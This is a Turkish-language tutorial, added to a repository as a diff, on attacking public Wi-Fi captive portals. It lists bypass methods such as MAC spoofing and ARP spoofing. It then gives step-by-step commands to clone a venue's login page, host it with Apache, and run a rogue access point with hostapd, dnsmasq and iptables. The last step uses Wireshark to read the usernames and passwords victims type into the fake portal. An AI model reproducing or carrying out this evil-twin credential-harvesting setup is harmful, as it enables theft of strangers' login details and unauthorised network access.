@@ -1,0 +1,120 @@
+	CAPTIVE PORTAL HACKING METHODS
+
+ Public internet kullanan mekanlarda internete bağlanmaya çalışırken
+ Bizden GSM No gibi bilgilerimizi istediği arayüze Captive Portal'dır.
+
+
+
+   Captive Portal neden kullanılır?
+ -Yasadışı bir iş yaparsak diye bize ait herhangi bir bilgiyi bilmek istiyor olabilirler.
+ Havaalanları gibi mekanlarda ücret karşılığı satılan internet olabilir.
+
+
+
+   Captive Portal ByPass edilerek neler yapılabilir?
+ -Kullanıcı adı ve şifre girmeden bağlanılabilir,
+ -Başkalarının kullanıcı bilgileri ile bağlanılabilir,
+ -Kendi Captive Portallarımız varsa daha güvenli hale getirilebilir,
+ -Captive Portalların bile çok da güvenli olmadığını gösterebiliriz.
+
+
+
+   Captive Portal ByPass etme yöntemleri nelerdir?
+ -MAC Adresini değiştirmek.
+ -Ağa karşı airodump-ng çalıştırtmak.
+ -Ağa bağlanıp arp spoofing yapmaya çalışmak.
+ -Sahte bir captive portal çalıştırmak.
+
+
+
+	CLONE CAPTIVE PORTAL
+ Herhangi bir şekilde interneti kullanmaya çalıştığımızda
+ bize o internet ağının yarattığı captive portal'a atayacaktır.
+
+ Alt -> File -> Save Page as -> Web Page, complete -> Save
+ Web sayfasındaki her şeyi indirip, kaydetmiş olacaktır.
+ Tamamını indir dememize rağmen eksik resimler vs. olabilir.
+
+ -> Eksik olan resimleri direkt sağ tıklayıp kaydetmeyi deneyebiliriz ama her zaman işe yaramayacak.
+ 
+ -> Inspect Element diyerek sitenin kodlarını görebiliyoruz.
+    Bu kısımdan görsellerin kodlarını bulmaya çalışacağız.
+    Resim linklerinin üstüne tıklayarak direkt olarak açabilir ve Save Image As diyerek kaydedebilirsiniz.
+    Tüm Dosyaları eksiksiz bir şekilde kaydettiğinizde Captive Portal'ı klonlamış olacağız.
+    [Dosyaları, File System -> /var/www/html/ içerisine kaydettik.
+
+
+
+service apache2 start
+192.168.2.246	-> adresine girdiğimizde klonlamış olduğumuz siteyi bize gösterecektir.
+		-> Herhangi bir sorun çıkarsa diye Kod yazabileceğimiz bir editör olan Geany'yi indirebiliriz.
+		    indirirken bir sorun çıkarsa apt-get update --fix-missing çalıştırdıktan sonra indirmemizi başlatabiliriz.
+		   .html dosyamızın üzerine Open with "geany" diyerek editörü açıyoruz.
+		   Search -> Replace > Search for: href="	Replace with:href="/ -> replace all > In Document	-> CTRL + S
+		   Bir şey bozup bozmadığımızı kontrol etmek için geçmişi silip Firefox'a "localhost/" yazabilirsiniz.
+		   Tekrardan index.html dosyamıza open with "geany" diyerek açtıktan sonra CTRL + F > "form" olanları aratıyoruz.
+			<form action= diye başlayan yerin devamında method="post" yazmazsa şunu yapmamız gerekiyor:
+			CTRL + F > "password" arattıktan sonra bulduğu yerden önce form tag'i kullanılmamış ise kendimiz yazacağız.
+			<form action="/index.html" method="post" id="loginForm">	-> CTRL + S
+		-> İşlemler bittikten sonra sitemiz kusursuz olarak çalışıyor olacaktır.
+
+
+
+
+	CREATE A MODEM
+ İhtiyaçlar: 1-Yayın yapan bir cihaz (wifi card veya modem) -> Çözüm: Hostapd
+	     2-Bağlanan cihazlara IP atayan bir sunucu	    -> Çözüm: Dnsmasq
+	     3-DNS'leri çözümleyecek bir DNS sunucusu	    -> Çözüm: Dnsmasq
+		Terminal: apt-get install hostapd dnsmasq
+
+
+  Herhangi bir hata ile karşılaşmamak için,
+  Yapılan port atamalarını silmemiz gerekiyor,
+  Bunun için:
+_______________________________________
+
+service NetworkManager stop
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+iptables -P FORWARD ACCEPT
+_______________________________________
+
+dnsmasq -C /root/Documents/Hotspot/dnsmasq.conf
+hostapd /root/Documents/Hotspot/hostapd.conf -B
+
+     AP-ENABLED  oldu ise çalışıyor demektir wifi ağlarına bakarsak oluşturduğumuz ağ gözükecektir.
+	olmadı ise alttaki yolları uygulayın.
+	> service NetworkManager restart çalıştır.
+	> service NetworkManager stop çalıştır.
+	> Sanal makineyi kapatıp açmayı dene.
+	> https://askubuntu.com/questions/191226/dnsmasq-failed-to-create-listening-socket-for-port-53-address-already-in-use
+
+ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
+service apache2 start
+
+ Bu işlem tamamlandıktan sonra artık kullanıcılar yarattığınız sahte ağa bağlanabiliyor olacaklardır.
+ Bunu yapmak için www'yu kaldırıp yerine https:// diye başlasın dememiz gerekiyor.
+
+leafpad /etc/apache2/sites-enabled/000-default.conf	-> Dosyasını değiştirdik.
+a2enmod rewrite		-> Üstte yazılan kuralların geçerli olması için rewrite'ı etkin hale getirdik.
+service apache2 start
+
+ Şuandan itibaren ağa bağlanan kullanıcılar direkt olarak Captive Portal'a atanacaktır.
+ Kullanıcı ne aratırsa aratsın ağ kişiyi Captive Portal'a yönlendirecektir.
+
+
+
+
+	READ PASSWORDS
+wireshark
+wlan0
+Start capturing packets
+
+ Apply a display filter kısmına "http" yazıyoruz, POST Metodu kullanan yere girdiğimizde 
+ Kullanıcının Captive Portal'a girdiği Kullanıcı adı ve Şifre bu kısımda gözükecektir.
+
+
+
